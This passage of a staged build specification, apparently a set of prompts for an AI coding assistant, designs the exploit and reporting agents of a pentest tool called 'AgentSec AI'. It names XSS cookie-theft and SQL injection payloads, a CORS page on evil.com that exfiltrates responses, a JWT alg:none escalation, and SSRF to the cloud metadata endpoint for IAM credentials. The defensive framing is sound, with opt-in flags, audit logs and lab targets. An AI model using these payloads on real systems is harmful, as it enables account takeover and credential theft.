  # WARNING: For authorized testing only.
  # Do NOT use against systems you do not own.
  
  TARGET = "{finding.affected_url}"
  PAYLOAD = "{payload}"
  
  response = requests.get(
      TARGET,
      params={{"{param}": PAYLOAD}},
      timeout=10,
      verify=False
  )
  
  print(f"Status: {{response.status_code}}")
  print(f"Payload reflected: {{PAYLOAD in response.text}}")
  """

PoCPayload dataclass:
  payload: str
  injection_point: str
  target_url: str
  poc_type: str
  impact: str
  curl_command: str
  python_poc: str
  sqlmap_command: str | None
  description: str

Generate payload_generator.py only. Stop after.
```

---

### Step 8.4 — XSS Session Hijack Demonstrator

```
PHASE 8 — STEP 4

Generate: backend/workers/modules/exploit/xss_demonstrator.py

Extraction from SHVE repo:
  Read tools/Session-Hijacking-Visual-Exploitation/
  for its session hijacking demonstration approach.
  REWRITE as AgentSec AI native class.
  The AgentSec AI version:
    - Never actually hijacks a real user session
    - Demonstrates that cookie theft IS possible
    - Uses a local mock callback server
    - Captures the stolen cookie in a controlled environment
    - Generates evidence screenshots and request/response logs

XSSSessionHijackDemonstrator class:

demonstrate(finding: Finding,
            scan_id: str) → async → ExploitResult:

  STEP 1: Validate this XSS is cookietheft-exploitable
    Check: session cookie has no HttpOnly flag
      (look for related finding in DB)
    If HttpOnly flag is present:
      Return result with note:
        "XSS exists but HttpOnly flag prevents cookie theft.
         Impact limited to DOM manipulation."
      poc_type = "dom_xss_limited"

  STEP 2: Start mock callback server
    server = MockCallbackServer(scan_id)
    callback_url = await server.start()
    (starts temporary httpx server on localhost
     to receive the stolen cookie)

  STEP 3: Generate cookie theft payload
    gen = ExploitPayloadGenerator()
    poc = gen.generate_xss_poc(finding, callback_url)

  STEP 4: Inject payload
    Send HTTP request with cookie theft payload
    to the vulnerable endpoint
    
    Use httpx AsyncClient:
      GET/POST affected_url
      with payload in affected_parameter
    
    Wait up to 5 seconds for callback to fire
      (callback fires when JS executes and calls our server)

  STEP 5: Check if callback received
    received = await server.wait_for_callback(timeout=5)
    
    If received:
      Confirms XSS is executable (not just reflected)
      stolen_data = received.query_params.get("c")
      
      Create ExploitResult:
        poc_generated = True
        impact = "CONFIRMED: XSS payload executed. Cookie exfiltration demonstrated."
        attacker_scenario = _describe_attack_scenario(finding)
        business_risk = _assess_business_risk(finding)
    
    If not received:
      XSS found but may be stored or DOM-based
      Return ExploitResult with note:
        "XSS payload injected but callback not received in 5s.
         May be stored XSS (fires on different page) or DOM-based.
         Requires manual verification."

  STEP 6: Collect evidence
    collector = EvidenceCollector(scan_id)
    
    Capture:
      The exact HTTP request sent
      The HTTP response received
      Screenshot via gowitness of vulnerable page (if possible)
    
    evidence_files = await collector.collect_all(
      request=injection_request,
      response=injection_response,
      finding=finding
    )

  STEP 7: Stop mock server
    await server.stop()

  STEP 8: Return result
    Return ExploitResult(
      finding_id=finding.id,
      exploit_type="XSS → Cookie Theft",
      poc_generated=True,
      poc_code=poc.python_poc,
      evidence_files=evidence_files,
      impact_statement=(
        "Attacker can steal authenticated session cookies, "
        "hijack user accounts, and perform actions on their behalf. "
        "Affects all users of the application."
      ),
      attacker_scenario=_describe_attack_scenario(finding),
      business_risk=_assess_business_risk(finding),
      remediation_priority="IMMEDIATE"
    )

MockCallbackServer class:
  Runs a minimal asyncio HTTP server on localhost
  random port between 18000-19000
  
  start() → async → str (callback URL)
    Starts server on localhost:{random_port}
    Returns http://127.0.0.1:{port}/callback
    Sets self.received = None
  
  wait_for_callback(timeout: int) → async → dict | None
    Waits for incoming request to /callback
    Returns query params dict if received
    Returns None if timeout expires
  
  stop() → async
    Shuts down server
    Cleans up

_describe_attack_scenario(finding) → str:
  Returns plain-English attacker story:
  """
  An attacker could craft a malicious link containing the XSS payload
  and send it to target users via phishing email or social media.
  When a logged-in user clicks the link, their session cookie is
  silently sent to the attacker's server. The attacker can then use
  this cookie to log in as the victim without knowing their password.
  """

_assess_business_risk(finding) → str:
  Returns business-focused risk statement:
  """
  Session hijacking allows complete account takeover for any user
  who visits the vulnerable page while logged in. This includes
  administrator accounts, potentially exposing all user data,
  administrative functions, and sensitive business information.
  Regulatory implications: potential GDPR breach notification required.
  """

Generate xss_demonstrator.py only. Stop after.
```

---

### Step 8.5 — PoC Script Generator

```
PHASE 8 — STEP 5

Generate: backend/workers/modules/exploit/poc_generator.py

PoCScriptGenerator class:

Generates complete, runnable PoC scripts for each
vulnerability type. These are included in the final
technical report and finding records.

generate(finding: Finding) → PoCBundle:
  
  vuln_type = _detect_vuln_type(finding.title)
  
  if vuln_type == "XSS":
    return _xss_poc(finding)
  elif vuln_type == "SQLi":
    return _sqli_poc(finding)
  elif vuln_type == "SSRF":
    return _ssrf_poc(finding)
  elif vuln_type == "LFI":
    return _lfi_poc(finding)
  elif vuln_type == "IDOR":
    return _idor_poc(finding)
  elif vuln_type == "JWT":
    return _jwt_poc(finding)
  elif vuln_type == "CORS":
    return _cors_poc(finding)
  elif vuln_type == "Open Redirect":
    return _redirect_poc(finding)
  else:
    return _generic_poc(finding)

PoCBundle dataclass:
  vuln_type: str
  curl_command: str
  python_script: str
  burp_request: str (raw HTTP request)
  impact_narrative: str
  remediation_code: str | None
  references: list[str] (CVE links, OWASP links)

_xss_poc(finding) → PoCBundle:
  curl_command:
    "curl -sk '{url}?{param}=<script>alert(1)</script>'"
  
  python_script:
    Full requests-based PoC script
    Checks if payload reflected in response
  
  burp_request:
    Raw HTTP GET/POST with payload
    Formatted exactly as Burp Suite shows it
  
  impact_narrative:
    Full paragraph explaining real-world impact
  
  remediation_code:
    Code snippet showing how to fix the issue:
    HTML encoding example in relevant language
    (detect language from tech stack in scan)
  
  references:
    ["https://owasp.org/www-community/attacks/xss/",
     "https://cwe.mitre.org/data/definitions/79.html"]

_sqli_poc(finding) → PoCBundle:
  curl_command:
    "curl -sk '{url}' -d '{param}=1 OR 1=1--'"
  
  python_script:
    requests-based script
    Tests multiple payloads
    Shows boolean-based blind detection
  
  burp_request:
    POST request with SQLi payload
  
  remediation_code:
    Parameterized query example in detected language:
    Python: cursor.execute("SELECT * FROM users WHERE id=%s", (user_id,))
    PHP: $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
    Java: PreparedStatement stmt = conn.prepareStatement(...)
  
  references:
    ["https://owasp.org/www-community/attacks/SQL_Injection",
     "https://cwe.mitre.org/data/definitions/89.html"]

_cors_poc(finding) → PoCBundle:
  python_script:
    Script that sends request with:
      Origin: https://evil.com
    Shows if Access-Control-Allow-Origin reflects it
    
  Also generates HTML PoC page:
    A complete HTML file an attacker could host on evil.com
    That sends AJAX request to vulnerable endpoint
    And exfiltrates the response

_jwt_poc(finding) → PoCBundle:
  python_script:
    Script using PyJWT library
    Demonstrates alg:none attack:
      Takes original JWT
      Modifies payload (escalate privileges)
      Signs with alg=none
      Sends modified JWT to API

_idor_poc(finding) → PoCBundle:
  python_script:
    Script that:
      Requests /api/resource/1
      Requests /api/resource/2
      Compares responses
      Shows different user data returned
  
  burp_request:
    GET /api/resource/2 with User 1 session cookie

_generic_poc(finding) → PoCBundle:
  Generates a template PoC with:
    Reproduction steps (numbered list)
    curl command if URL available
    Manual verification steps
    What to look for in the response

Generate poc_generator.py only. Stop after.
```

---

### Step 8.6 — Evidence Collector

```
PHASE 8 — STEP 6

Generate: backend/workers/modules/exploit/evidence_collector.py

EvidenceCollector class:

Collects forensic-quality evidence for each exploit:
  HTTP request/response pairs
  Screenshots of vulnerable state
  Video capture (if gowitness supports it)
  Annotated evidence files

__init__(scan_id: str):
  self.scan_id = scan_id
  self.evidence_dir = f"/tmp/agentsec_{scan_id}_evidence"
  os.makedirs(self.evidence_dir, exist_ok=True)
  self.collected_files = []

collect_request_response(
    url: str,
    method: str,
    headers: dict,
    payload: str,
    response_text: str,
    response_status: int,
    finding: Finding) → async → str:

  Format evidence as readable text file:
  
  content = f"""
  ═══════════════════════════════════════
  AgentSec AI — Vulnerability Evidence
  ═══════════════════════════════════════
  Finding: {finding.title}
  Severity: {finding.severity}
  OWASP: {finding.owasp_category}
  CVE: {finding.cve_id or 'N/A'}
  Timestamp: {datetime.utcnow().isoformat()}
  ───────────────────────────────────────
  HTTP REQUEST
  ───────────────────────────────────────
  {method} {url}
  Host: {extract_host(url)}
  User-Agent: AgentSec-AI-Scanner/1.0
  {format_headers(headers)}
  
  {payload}
  ───────────────────────────────────────
  HTTP RESPONSE
  ───────────────────────────────────────
  HTTP/1.1 {response_status}
  
  {response_text[:2000]}
  {'[TRUNCATED]' if len(response_text) > 2000 else ''}
  ═══════════════════════════════════════
  """
  
  filename = f"{finding.id}_{sanitize(finding.title)}.txt"
  filepath = os.path.join(self.evidence_dir, filename)
  Write content to filepath
  self.collected_files.append(filepath)
  Return filepath

capture_screenshot(url: str,
                   label: str) → async → str | None:
  
  If gowitness not installed:
    Log warning: "gowitness not available for screenshot"
    Return None
  
  output_path = f"{evidence_dir}/{label}_screenshot.png"
  
  Run: ["gowitness", "single",
        "--url", url,
        "--screenshot-path", output_path,
        "--timeout", "15"]
  
  If screenshot captured:
    self.collected_files.append(output_path)
    Return output_path
  Return None

capture_vulnerable_state(finding: Finding,
                          poc: PoCPayload) → async → str:
  
  Screenshots two states:
  
  State 1: Normal page (before payload)
    screenshot_normal = await capture_screenshot(
      finding.affected_url, f"{finding.id}_normal"
    )
  
  State 2: Vulnerable response (after payload)
    Generate URL with payload injected
    screenshot_vuln = await capture_screenshot(
      inject_payload_in_url(finding, poc.payload),
      f"{finding.id}_vulnerable"
    )
  
  Return paths as JSON string

generate_evidence_summary(finding: Finding) → str:
  Creates a human-readable evidence summary:
  
  """
  VULNERABILITY EVIDENCE SUMMARY
  ===============================
  Title: {finding.title}
  Severity: {finding.severity}
  Confirmed: {finding.is_confirmed}
  
  FILES COLLECTED:
  {list of self.collected_files}
  
  REPRODUCTION STEPS:
  1. Navigate to: {finding.affected_url}
  2. {step 2 based on vuln type}
  3. Observe: {expected result}
  
  EVIDENCE LOCATION:
  {evidence_dir}
  """

get_all_files() → list[str]:
  Return self.collected_files

cleanup() → None:
  Removes temp evidence files after
  they have been stored in DB or report.
  Called by exploit_agent after phase completes.

Generate evidence_collector.py only. Stop after.
```

---

### Step 8.7 — Exploit Chain Executor

```
PHASE 8 — STEP 7

Generate: backend/workers/modules/exploit/chain_executor.py

ExploitChainExecutor class:

Executes multi-step vulnerability chains discovered
by VulnValidator in Phase 6.

run(scan_id: str,
    findings: list[Finding],
    single_exploit_results: list[ExploitResult],
    db: AsyncSession) → async → list[ExploitResult]

  chain_candidates = condition_checker.get_chain_candidates(findings)
  
  chain_results = []
  
  For each chain in chain_candidates:
    result = await _execute_chain(chain, scan_id)
    if result:
      chain_results.append(result)
  
  Return chain_results

_execute_chain(chain: tuple,
               scan_id: str) → async → ExploitResult | None:

  chain_type = _identify_chain_type(chain)
  
  if chain_type == "XSS_SESSION_HIJACK":
    return await _chain_xss_session(chain, scan_id)
  
  elif chain_type == "OPEN_REDIRECT_OAUTH":
    return await _chain_redirect_oauth(chain, scan_id)
  
  elif chain_type == "SSRF_METADATA":
    return await _chain_ssrf_metadata(chain, scan_id)
  
  elif chain_type == "SQLI_AUTH_BYPASS":
    return await _chain_sqli_auth(chain, scan_id)

_chain_xss_session(chain, scan_id) → async:
  xss_finding, cookie_finding = chain
  
  Generate combined PoC that shows:
    Step 1: XSS payload sends cookie to attacker
    Step 2: Attacker uses cookie in new session
    Step 3: Attacker is now authenticated as victim
  
  Create ExploitResult:
    exploit_type = "Chain: XSS → Session Hijacking"
    impact_statement = (
      "Attacker can steal session cookie via XSS "
      "(possible because HttpOnly is missing). "
      "Using stolen cookie grants full account access. "
      "This chain escalates XSS to Account Takeover."
    )
    severity_escalation = "HIGH → CRITICAL"
    
  Create new Finding record for the chain:
    title = "Attack Chain: XSS → Session Hijacking"
    severity = CRITICAL (escalated)
    description = full chain description
    evidence = combined evidence from both steps
    owasp_category = "A07:2025"

_chain_redirect_oauth(chain, scan_id) → async:
  redirect_finding, oauth_finding = chain
  
  Generate PoC showing:
    1. OAuth authorization URL with redirect_uri
       pointing to attacker-controlled open redirect
    2. User is redirected with OAuth token
       to attacker's domain via the open redirect
    3. Token is stolen without user knowledge
  
  Create ExploitResult:
    exploit_type = "Chain: Open Redirect → OAuth Token Theft"
    python_poc = _generate_oauth_token_theft_poc(
      redirect_finding, oauth_finding
    )

_chain_ssrf_metadata(chain, scan_id) → async:
  ssrf_finding, cloud_finding = chain
  
  Generate PoC showing theoretical path:
    1. SSRF allows requests to 169.254.169.254
    2. Cloud metadata returns IAM credentials
    3. Credentials allow cloud API access
  
  NOTE: Do NOT actually send requests to metadata endpoint.
  This is documentation-only chain demonstration.
  
  Create ExploitResult:
    exploit_type = "Chain: SSRF → Cloud Credential Theft"
    impact_statement = (
      "SSRF can reach cloud metadata service. "
      "This may expose IAM credentials granting "
      "access to entire cloud infrastructure."
    )

_chain_sqli_auth(chain, scan_id) → async:
  sqli_finding, auth_finding = chain
  
  Generate PoC showing:
    1. SQLi in login form: ' OR '1'='1
    2. Authentication bypassed
    3. Admin account accessed
  
  Create ExploitResult:
    exploit_type = "Chain: SQLi → Authentication Bypass"
    python_poc = _generate_sqli_auth_bypass_poc(
      sqli_finding
    )

_generate_oauth_token_theft_poc(redirect, oauth) → str:
  Python script that:
    1. Crafts malicious OAuth URL with redirect_uri
       pointing to open redirect endpoint
    2. Shows what the victim sees
    3. Shows what token the attacker receives
    Includes: comments, impact, remediation

Generate chain_executor.py only. Stop after.
```

---

### Step 8.8 — Phase 8 Verification

```
PHASE 8 — STEP 8 — FINAL VERIFICATION

Phase 8 complete. Write tests/test_exploit_agent.py

Test cases:

1. test_exploit_agent_disabled_by_default
   Set settings.EXPLOIT_AGENT_ENABLED = False
   Run exploit agent
   Assert: returns {"status": "disabled"}
   Assert: no findings modified in DB
   Assert: no HTTP requests made to target

2. test_condition_checker_filters_unsafe_urls
   Finding with url="/api/users/delete"
   Assert: _is_safe_to_exploit() returns False
   Assert: finding NOT in eligible list

3. test_condition_checker_filters_payment_urls
   Finding with url="/checkout/payment"
   Assert: _is_safe_to_exploit() returns False

4. test_condition_checker_requires_evidence
   Finding with evidence=None, affected_url=None
   Assert: _is_safe_to_exploit() returns False

5. test_payload_generator_xss_basic
   Call generate_xss_poc(finding, callback_url=None)
   Assert: payload contains "<script>alert"
   Assert: curl_command contains the URL
   Assert: python_script is valid Python syntax

6. test_payload_generator_xss_cookie_theft
   Call generate_xss_poc(finding, callback_url="http://localhost:18500")
   Assert: payload contains callback_url
   Assert: poc_type == "cookie_theft"

7. test_payload_generator_sqli
   Call generate_sqli_poc(finding)
   Assert: payload contains "OR"
   Assert: sqlmap_command contains "-u"
   Assert: python_poc mentions parameterized queries

8. test_mock_callback_server_starts
   server = MockCallbackServer("test-scan-001")
   url = await server.start()
   Assert: url starts with "http://127.0.0.1:"
   Assert: port between 18000-19000
   await server.stop()

9. test_mock_callback_receives_request
   server = MockCallbackServer("test-scan-001")
   url = await server.start()
   
   Use httpx to GET url?c=test_cookie
   received = await server.wait_for_callback(timeout=2)
   
   Assert: received is not None
   Assert: received["c"] == "test_cookie"
   await server.stop()

10. test_xss_demonstrator_httponly_skip
    Related finding: session cookie HAS HttpOnly flag
    Run demonstrate(xss_finding, scan_id)
    Assert: result.impact_statement contains "HttpOnly"
    Assert: result.poc_type == "dom_xss_limited"
    Assert: no callback server started

11. test_evidence_collector_creates_file
    collector = EvidenceCollector("test-scan-001")
    path = await collector.collect_request_response(
      url="http://example.com/test",
      method="GET",
      headers={},
      payload="<script>alert(1)</script>",
      response_text="<script>alert(1)</script>",
      response_status=200,
      finding=mock_finding
    )
    Assert: os.path.exists(path) == True
    content = open(path).read()
    Assert: "HTTP REQUEST" in content
    Assert: "HTTP RESPONSE" in content

12. test_chain_executor_xss_session
    findings = [xss_finding, cookie_no_httponly_finding]
    chains = condition_checker.get_chain_candidates(findings)
    Assert: len(chains) >= 1
    Assert: chain type is XSS_SESSION_HIJACK

13. test_chain_creates_new_finding
    Run _chain_xss_session(chain, scan_id)
    Assert: new Finding created in DB
    Assert: new finding severity == CRITICAL
    Assert: title contains "Attack Chain"

14. test_poc_bundle_valid_python
    poc = _xss_poc(mock_finding)
    Attempt to compile poc.python_script
    Assert: no SyntaxError raised
    Assert: "import requests" in poc.python_script
    Assert: "# WARNING" in poc.python_script

15. test_exploit_agent_audit_logging
    Enable exploit agent, run with 1 XSS finding
    Query AuditLog table for scan_id
    Assert: at least 2 AuditLog entries:
      1 for "PoC Attempt" start
      1 for result
    Assert: each entry has scan_id, finding_id, action

Run: pytest tests/test_exploit_agent.py -v
All 15 must pass.
Phase 8 only complete when all 15 pass.

SAFETY NOTE:
All tests in this phase use mocked HTTP responses.
No actual exploitation requests are made during testing.
Mock httpx in all tests that would make network calls.

Integration test:
  Do NOT run live exploitation in CI/CD.
  Only run manually against:
    Your own test lab environment
    OR scanme.nmap.org (but note it has no XSS/SQLi)
  
  For actual exploit testing use:
    DVWA (Damn Vulnerable Web Application) in Docker
    docker run -d -p 8080:80 vulnerables/web-dvwa
    Then set scan target to http://localhost:8080
    This gives you a legal, controlled target with
    real vulnerabilities to test all exploit modules.
```

---

## Phase Summary

| Phase | Steps | Key Files | Core Extraction | Verify At |
|---|---|---|---|---|
| Phase 7 | 7.1 → 7.9 | secret_agent, js_extractor, git_scanner, file_scanner, secret_validator, cloud_module, osint_enricher, notifier | BCHackTool notifications, claude-bug-bounty secret validation, SHVE JS analysis | Step 7.9 only |
| Phase 8 | 8.1 → 8.8 | exploit_agent, condition_checker, payload_generator, xss_demonstrator, poc_generator, evidence_collector, chain_executor | SHVE payload logic, session hijack flow, callback server | Step 8.8 only |

---

## Three Absolute Rules for Phase 8

```
1. EXPLOIT_AGENT_ENABLED = False in all .env files
   by default. Developer must manually set to True.

2. Never test Phase 8 against live production targets.
   Use DVWA in Docker for integration tests.

3. Every exploit attempt logs to AuditLog.
   If logging fails, the exploit attempt must abort.
   No silent exploitation ever.
```

# PHASE 9 — REPORTING AGENT

---

### Step 9.0 — Phase 9 Master Context

```
PHASE 9 — REPORTING AGENT

Phases 0-8 complete.
Now building the final pipeline agent —
the Reporting Agent.

This agent:
- Triggers ONLY after ALL of these Redis flags are set:
    agentsec:vuln_complete:{scan_id}
    agentsec:secrets_complete:{scan_id}
  AND either:
    agentsec:exploit_complete:{scan_id}
    OR exploit agent is disabled (skip flag)

- Responsibility:
    1. Pull ALL findings from DB for this scan
    2. Deduplicate and finalize finding list
    3. Map every finding to OWASP / CVE / CWE
    4. Generate AI-powered analysis via Claude API
    5. Build attack path narrative
    6. Generate risk prioritization
    7. Build executive summary (plain English)
    8. Generate remediation plan
    9. Render professional PDF report
    10. Send completion notifications
    11. Mark scan as COMPLETED

Extraction from cloned repos for this phase:

  claude-bug-bounty:
    Extract its report structure methodology:
      How to write executive summary
      How to explain business impact
      How to prioritize remediation
      Bug chaining explanation style
    Rewrite as AI prompt templates in:
      backend/reports/ai_prompts.py

  BCHackTool:
    Extract its notification trigger logic
    (already done in Phase 7, reuse ImmediateNotifier)
    Extract its report summary format
    Rewrite as ReportSummaryBuilder

Architecture rules:
  - One Celery task: report.start
  - Report generated in memory first
    then written to disk as PDF
  - PDF stored at:
      /reports/output/{scan_id}/report.pdf
  - Report also available as JSON via API
  - AI calls use Claude API (claude-sonnet-4-6)
  - If AI call fails: generate report without AI sections
    (graceful degradation, never block report)
  - Final report sent to user via WebSocket + notification

Token rule:
Generate in order, wait for "next" between each:
  Step 9.1: Report Agent Task
  Step 9.2: Finding Aggregator
  Step 9.3: AI Report Generator (Claude API integration)
  Step 9.4: Attack Path Builder
  Step 9.5: Risk Prioritizer
  Step 9.6: PDF Builder
  Step 9.7: Report Notifier
  Step 9.8: Verification
```

---

### Step 9.1 — Report Agent Task

```
PHASE 9 — STEP 1

Generate: backend/workers/report_agent.py

Task: report.start

@celery_app.task(
  bind=True,
  name="report.start",
  queue="report_queue",
  max_retries=2,
  autoretry_for=(Exception,),
  default_retry_delay=60,
  soft_time_limit=1800,
  time_limit=2100
)
def start_report(self, scan_id: str) → dict:
  return asyncio.run(_async_start_report(self, scan_id))

Async implementation _async_start_report():

STEP 1: Initialize
  Get DB session, EventBus
  
  Update Scan:
    current_phase = "Report Generation"
    current_tool = "Aggregating Findings"
    status = RUNNING
  
  Create output directory:
    /reports/output/{scan_id}/
    os.makedirs(path, exist_ok=True)
  
  Log: "Report Agent started for scan {scan_id}"

STEP 2: Aggregate all findings
  aggregator = FindingAggregator(db)
  report_data = await aggregator.build(scan_id)
  
  If report_data.total_findings == 0:
    Log: "No findings. Generating clean report."
  
  Update Scan.current_tool = "AI Analysis"
  Publish WebSocket: {step: "ai_analysis_started"}

STEP 3: Generate AI analysis
  ai_generator = AIReportGenerator()
  
  ai_content = await ai_generator.generate_all(
    scan_id=scan_id,
    report_data=report_data
  )
  
  If AI generation fails:
    Log warning: "AI generation failed. Using fallback text."
    ai_content = AIContent.fallback(report_data)

STEP 4: Build attack paths
  path_builder = AttackPathBuilder(db)
  attack_paths = await path_builder.build(
    scan_id=scan_id,
    findings=report_data.findings
  )

STEP 5: Build risk prioritization
  risk_prioritizer = RiskPrioritizer()
  prioritized = risk_prioritizer.prioritize(
    findings=report_data.findings,
    context=report_data.context
  )

STEP 6: Assemble full report data object
  full_report = ReportDocument(
    scan=report_data.scan,
    target_info=report_data.target_info,
    executive_summary=ai_content.executive_summary,
    attack_surface=report_data.attack_surface,
    technology_stack=report_data.tech_stack,
    findings=report_data.findings,
    attack_paths=attack_paths,
    risk_prioritization=prioritized,
    secrets=report_data.secret_findings,
    cloud_exposures=report_data.cloud_findings,
    remediation_plan=ai_content.remediation_plan,
    scan_statistics=report_data.statistics,
    appendix=report_data.appendix,
    ai_content=ai_content,
    generated_at=datetime.utcnow()
  )

STEP 7: Render PDF
  Update Scan.current_tool = "PDF Generation"
  Publish WebSocket: {step: "pdf_generation_started"}
  
  pdf_builder = PDFBuilder()
  pdf_path = await pdf_builder.render(
    report=full_report,
    output_path=f"/reports/output/{scan_id}/report.pdf"
  )

STEP 8: Store report metadata in DB
  Create Report record:
    scan_id = scan_id
    pdf_path = pdf_path
    total_findings = report_data.total_findings
    critical_count = report_data.critical_count
    high_count = report_data.high_count
    medium_count = report_data.medium_count
    low_count = report_data.low_count
    info_count = report_data.info_count
    risk_score = report_data.scan.risk_score
    generated_at = datetime.utcnow()
    ai_summary = ai_content.executive_summary[:1000]

STEP 9: Mark scan complete
  Update Scan:
    status = COMPLETED
    progress = 100
    completed_at = datetime.utcnow()
    current_phase = "Completed"
    current_tool = None
  
  Transition all assets to REPORTED state:
    await state_machine.bulk_transition(
      scan_id=scan_id,
      new_state=AssetState.REPORTED
    )

STEP 10: Send notifications
  notifier = ReportNotifier()
  await notifier.send_completion(
    scan_id=scan_id,
    target=report_data.scan.target,
    pdf_path=pdf_path,
    summary=report_data.summary
  )

STEP 11: Fire final event
  Publish AllCompleteEvent(scan_id=scan_id)
  
  Publish WebSocket final update:
    {
      step: "scan_complete",
      progress: 100,
      report_url: f"/api/v1/reports/{scan_id}/download",
      total_findings: report_data.total_findings,
      critical: report_data.critical_count,
      risk_score: report_data.scan.risk_score
    }
  
  Log: "Scan {scan_id} fully complete.
        Report at {pdf_path}"
  
  Return {
    "scan_id": scan_id,
    "status": "complete",
    "pdf_path": pdf_path,
    "total_findings": total_findings,
    "risk_score": risk_score
  }

Generate report_agent.py only. Stop after.
```

---

### Step 9.2 — Finding Aggregator

```
PHASE 9 — STEP 2

Generate: backend/workers/processors/finding_aggregator.py

FindingAggregator class:

Reads all scan data from DB and builds
a complete structured object for the report.

build(scan_id: str,
      db: AsyncSession) → async → ReportData

  STEP 1: Load scan record
    scan = await db.get(Scan, scan_id)
    If not found: raise ReportError("Scan not found")

  STEP 2: Load all findings
    findings = await db.execute(
      select(Finding)
      .where(Finding.scan_id == scan_id)
      .where(Finding.is_false_positive == False)
      .order_by(Finding.severity.desc(),
                Finding.cvss_score.desc())
    )
    findings = findings.scalars().all()

  STEP 3: Load all assets
    domains = load all Domain records for scan_id
    subdomains = load all Subdomain records for scan_id
    hosts = load all Host records for scan_id
    ports = load all Port records for scan_id
    services = load all Service records for scan_id
    technologies = load all Technology records for scan_id
    endpoints = load all Endpoint records for scan_id

  STEP 4: Separate findings by category
    secret_findings = [f for f in findings
      where f.title contains secret-related keywords
      OR f.tool_found_by in ["trufflehog","gitleaks",
        "secretfinder","regex_extractor"]]
    
    cloud_findings = [f for f in findings
      where "S3" or "Azure" or "GCP" or "bucket"
      in f.title]
    
    vuln_findings = remaining findings

  STEP 5: Count by severity
    critical = len([f where severity==CRITICAL])
    high = len([f where severity==HIGH])
    medium = len([f where severity==MEDIUM])
    low = len([f where severity==LOW])
    info = len([f where severity==INFO])

  STEP 6: Build attack surface summary
    attack_surface = AttackSurface(
      total_subdomains = len(subdomains),
      live_hosts = len([s where s.is_alive]),
      dead_hosts = len([s where not s.is_alive]),
      total_open_ports = len(ports),
      dangerous_ports = [p.number where p.is_dangerous],
      running_services = list of unique service names,
      admin_panels = [e.url where e.is_admin and 200 status],
      api_endpoints = len([e where e.is_api]),
      login_pages = [e.url where e.is_login],
      js_files = len([e where e.is_js_file]),
      exposed_files = [f.affected_url where
        "backup" or "config" in f.title.lower()]
    )

  STEP 7: Build technology stack summary
    tech_by_category = group technologies by category
    tech_stack = TechStack(
      cms = [t.name where t.category==CMS],
      frameworks = [t.name where t.category==FRAMEWORK],
      servers = [t.name where t.category==SERVER],
      languages = [t.name where t.category==LANGUAGE],
      databases = [t.name where t.category==DATABASE],
      cdn = [t.name where t.category==CDN],
      js_libs = [t.name where t.category==JAVASCRIPT_LIBRARY],
      outdated = [t for t where t.is_outdated]
    )

  STEP 8: Build target info
    domain = first Domain record
    target_info = TargetInfo(
      domain = scan.target,
      ip_address = domain.ip_address,
      registrar = domain.registrar,
      registration_date = domain.registration_date,
      expiry_date = domain.expiry_date,
      hosting_provider = domain.hosting_provider,
      asn = domain.asn,
      country = domain.country,
      waf_detected = first host.waf_detected,
      waf_name = first host.waf_name,
      tech_stack = tech_stack
    )

  STEP 9: Build scan statistics
    first_task = earliest Task for this scan_id
    last_task = latest Task for this scan_id
    
    statistics = ScanStatistics(
      start_time = scan.started_at,
      end_time = scan.completed_at,
      duration_minutes = calculate_duration(),
      total_requests = sum all Result.record_count,
      tools_used = list of unique Task.tool_name,
      tools_failed = [t.tool_name where t.status==FAILED],
      fallbacks_used = [t for t where t.fallback_tool
                        is not None],
      assets_scanned = scan.total_assets,
      subdomains_discovered = len(subdomains),
      endpoints_crawled = len(endpoints)
    )

  STEP 10: Build appendix
    appendix = Appendix(
      all_subdomains = [s.name for s in subdomains],
      all_open_ports = [(p.host_id, p.number, p.protocol,
                         p.state) for p in ports],
      all_endpoints = [e.url for e in endpoints
                       if not e.is_js_file][:500],
      all_technologies = [(t.name, t.version)
                          for t in technologies],
      raw_tool_outputs = [] (populated on demand)
    )

  Return ReportData(
    scan=scan,
    target_info=target_info,
    findings=findings,
    secret_findings=secret_findings,
    cloud_findings=cloud_findings,
    attack_surface=attack_surface,
    tech_stack=tech_stack,
    statistics=statistics,
    appendix=appendix,
    total_findings=len(findings),
    critical_count=critical,
    high_count=high,
    medium_count=medium,
    low_count=low,
    info_count=info,
    context=scan.scan_config
  )

Generate finding_aggregator.py only. Stop after.
```

---

### Step 9.3 — AI Report Generator

```
PHASE 9 — STEP 3

Generate: backend/reports/ai_report_generator.py
          backend/reports/ai_prompts.py

Generate both files in one response.

─────────────────────────────────────────

ai_prompts.py:

Extraction from claude-bug-bounty:
  Reference tools/claude-bug-bounty/ for its
  report writing methodology and explanation style.
  Rewrite all prompts from scratch as Python strings.
  Do NOT copy verbatim. Rewrite in AgentSec AI voice.

All prompts are Python f-strings.
Each function returns a complete prompt string.

EXECUTIVE_SUMMARY_PROMPT(report_data) → str:
  f"""
  You are a senior penetration tester writing an
  executive summary for a security assessment report.
  Your audience is non-technical business executives
  and C-suite stakeholders.
  
  Write in plain English. No technical jargon.
  Be direct, clear, and professional.
  Maximum 4 paragraphs.
  
  SCAN INFORMATION:
  Target: {report_data.scan.target}
  Scan Date: {report_data.scan.started_at}
  Duration: {report_data.statistics.duration_minutes} minutes
  
  FINDINGS SUMMARY:
  Total Vulnerabilities: {report_data.total_findings}
  Critical: {report_data.critical_count}
  High: {report_data.high_count}
  Medium: {report_data.medium_count}
  Low: {report_data.low_count}
  Overall Risk Score: {report_data.scan.risk_score}/100
  
  KEY CRITICAL FINDINGS:
  {format_top_findings(report_data.findings[:5])}
  
  ATTACK SURFACE:
  Total Assets Discovered: {report_data.attack_surface.total_subdomains}
  Live Hosts: {report_data.attack_surface.live_hosts}
  Exposed Services: {len(report_data.attack_surface.dangerous_ports)}
  
  Write the executive summary covering:
  1. Overall security posture (1 paragraph)
  2. Most critical risks and their business impact (1 paragraph)
  3. What an attacker could realistically do (1 paragraph)
  4. Immediate next steps recommended (1 paragraph)
  
  Do NOT use bullet points. Write in paragraph form only.
  Do NOT mention technical tool names (Nuclei, SQLMap, etc).
  DO mention business impact (data breach, downtime, compliance).
  """

FINDING_ANALYSIS_PROMPT(finding) → str:
  f"""
  You are a senior security analyst explaining a
  vulnerability to both technical and non-technical readers.
  
  VULNERABILITY DETAILS:
  Title: {finding.title}
  Severity: {finding.severity}
  CVSS Score: {finding.cvss_score or 'N/A'}
  CVE: {finding.cve_id or 'N/A'}
  CWE: {finding.cwe_id or 'N/A'}
  OWASP Category: {finding.owasp_category}
  Affected URL: {finding.affected_url}
  Evidence: {finding.evidence[:500] if finding.evidence else 'N/A'}
  
  Write THREE sections:
  
  1. BUSINESS IMPACT (2-3 sentences)
